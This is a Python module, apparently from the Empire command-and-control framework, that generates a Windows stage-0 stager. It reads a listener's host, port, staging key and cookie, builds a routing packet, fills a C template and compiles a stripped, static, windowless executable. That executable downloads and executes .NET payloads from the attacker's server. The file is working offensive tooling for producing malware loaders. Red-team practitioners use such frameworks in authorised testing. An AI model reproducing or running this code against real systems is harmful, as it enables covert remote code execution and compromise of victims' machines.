import base64
import logging
import subprocess
import tempfile
from pathlib import Path

from empire.server.common import packets

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "C Windows Stager",
            "Authors": [
                {
                    "Name": "Anthony Rose",
                    "Handle": "@Cx01N",
                    "Link": "https://twitter.com/Cx01N_",
                }
            ],
            "Description": "Compiles a stage 0 C stager that pulls down stage 1 .NET payloads for Windows. Used as an initial stager to download and execute .NET-based Empire payloads.",
            "Comments": [""],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "csharp",
                "SuggestedValues": [
                    "powershell",
                    "ironpython",
                    "csharp",
                ],
                "Strict": True,
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "stager.exe",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        listener_name = self.options["Listener"]["Value"]
        language = self.options["Language"]["Value"]
        listener = self.mainMenu.listenersv2.get_active_listener_by_name(listener_name)

        if not listener:
            log.error(f"[!] Listener '{listener_name}' not found or not active.")
            return ""

        if listener.info.get("Name") != "HTTP[S]":
            log.error("[!] c_launcher only supports the HTTP[S] listener.")
            return ""

        host = listener.options["Host"]["Value"]
        port = listener.options["Port"]["Value"]
        staging_key = listener.options["StagingKey"]["Value"]
        cookie_name = listener.options["Cookie"]["Value"]

        profile = listener.options["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        staging_path = f"/{uris[0]}"

        routing_packet = packets.build_routing_packet(
            staging_key,
            sessionID="00000000",
            language=language,
            meta="STAGE0",
            additional="SHELLCODE",
            encData="",
        )

        b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
        cookie_value = f"{cookie_name}={b64_routing_packet}"

        use_https = "TRUE" if "https" in host.lower() else "FALSE"
        clean_host = (
            host.replace("http://", "")
            .replace("https://", "")
            .split(":")[0]
            .split("/")[0]
        )

        template_path = Path(self.mainMenu.installPath) / "data" / "misc" / "windows.c"
        if not template_path.exists():
            log.error(f"[!] Template not found at {template_path}")
            return ""

        code = template_path.read_text()

        code = code.replace("{{ host }}", clean_host)
        code = code.replace("{{ port }}", str(port))
        code = code.replace("{{ staging_path }}", staging_path)
        code = code.replace("{{ use_https }}", use_https)
        code = code.replace("{{ cookie }}", cookie_value)

        with tempfile.TemporaryDirectory() as temp_dir:
            c_file = Path(temp_dir) / "windows.c"
            exe_file = Path(temp_dir) / "stager.exe"

            c_file.write_text(code)

            compiler = "x86_64-w64-mingw32-gcc"
            args = [
                compiler,
                "-std=c99",
                "-Os",
                "-s",
                "-fno-ident",
                "-fno-asynchronous-unwind-tables",
                "-ffunction-sections",
                "-fdata-sections",
                str(c_file),
                "-o",
                str(exe_file),
                "-lwinhttp",
                "-lbcrypt",
                "-static",
                "-Wl,-subsystem,windows",
                "-Wl,--gc-sections",
            ]

            try:
                subprocess.run(args, capture_output=True, text=True, check=True)
            except subprocess.CalledProcessError as e:
                log.error(f"[!] Compilation failed: {e.stderr}")
                return ""

            if exe_file.exists():
                return exe_file.read_bytes()
            log.error("[!] Exe file was not created.")
            return ""
